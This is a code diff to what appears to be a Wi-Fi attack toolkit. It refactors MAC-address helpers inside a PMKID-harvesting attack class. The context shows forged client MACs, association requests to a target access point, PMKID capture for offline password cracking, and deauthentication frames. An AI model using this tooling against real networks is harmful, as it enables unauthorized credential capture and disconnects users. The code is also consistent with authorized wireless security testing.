@@ -32,7 +32,7 @@ import time
 from typing import Optional
 
 from wifit3.models import AccessPoint
-from wifit3.dot11 import build_deauth
+from wifit3.dot11 import build_deauth, mac_to_str, str_to_mac
 from wifit3.dot11.ie import force_psk_akm, GENERIC_RSN_IE
 
 from .campaign import Campaign
@@ -49,15 +49,8 @@ class PmkidFail(enum.Enum):
     NO_RESPONSE = "no_response"     # never got an M1 (AP stayed silent)
 
 
-def _mac_bytes_to_str(b: bytes) -> str:
-    return ":".join(f"{x:02x}" for x in b)
-
-
 _AKM_PSK = 0x02                  # 00-0F-AC:2 (PSK).
 _HARVESTABLE_AKMS = (_AKM_PSK,)  # AKMs whose PMK we can harvest *and* crack offline.
-
-def _str_to_mac(mac: str) -> bytes:
-    return bytes(int(x, 16) for x in mac.split(":"))
 
 
 def _random_client_mac() -> bytes:
@@ -107,7 +100,7 @@ class PmkidHarvestAttack(Campaign):
     ):
         super().__init__(ap=target, array=array)
         self.target = target
-        self.bssid_bytes = _str_to_mac(target.bssid)
+        self.bssid_bytes = str_to_mac(target.bssid)
         self.source_mac = source_mac or _random_client_mac()
         self.attempts = attempts
         self.m1_timeout = m1_timeout
@@ -123,7 +116,7 @@ class PmkidHarvestAttack(Campaign):
     @property
     def client_mac(self) -> str:
         """The forged STA MAC we currently impersonate."""
-        return _mac_bytes_to_str(self.source_mac)
+        return mac_to_str(self.source_mac)
 
     def _rotate_mac(self) -> None:
         self.source_mac = _random_client_mac()
@@ -142,7 +135,7 @@ class PmkidHarvestAttack(Campaign):
         ap_state = self.array.access_points.get(self.target.bssid.lower())
         if not ap_state:
             return None
-        return ap_state.handshakes.get(_mac_bytes_to_str(self.source_mac))
+        return ap_state.handshakes.get(mac_to_str(self.source_mac))
 
     async def _send_leaving_deauth(self, count: int = 3) -> None:
         """Deauth the AP (×count) the instant we have M1 (we're done)."""
@@ -188,11 +181,11 @@ class PmkidHarvestAttack(Campaign):
             armed = await self.iface.set_fake_mac(self.source_mac, self.bssid_bytes)
             self._armed = self._armed or (armed is not None)
             if armed:
-                self.source_mac = _str_to_mac(armed)
+                self.source_mac = str_to_mac(armed)
                 self.array.register_forged_mac(self.source_mac)   # the HW-assigned MAC
             logger.info(
                 f"[PMKID] Attempt {attempt}/{self.attempts}: Auth + Assoc Req to "
-                f"{self.target.bssid} as {_mac_bytes_to_str(self.source_mac)}"
+                f"{self.target.bssid} as {mac_to_str(self.source_mac)}"
                 f"{' (HW-ACKed)' if armed else ''}"
             )
             self.log(f"Auth → Assoc [dim bold](client MAC: {self.client_mac})[/dim bold]"
@@ -221,7 +214,7 @@ class PmkidHarvestAttack(Campaign):
                             hs.akm_client = _AKM_PSK   # we negotiated PSK in our Assoc
                         logger.info(
                             f"[PMKID] Harvested {hs.pmkid.hex()} from {self.target.bssid} "
-                            f"(STA {_mac_bytes_to_str(self.source_mac)})"
+                            f"(STA {mac_to_str(self.source_mac)})"
                         )
                         self.log("[bold]M1[/bold] received: "
                                  "[bright_green]PMKID present[/bright_green]")
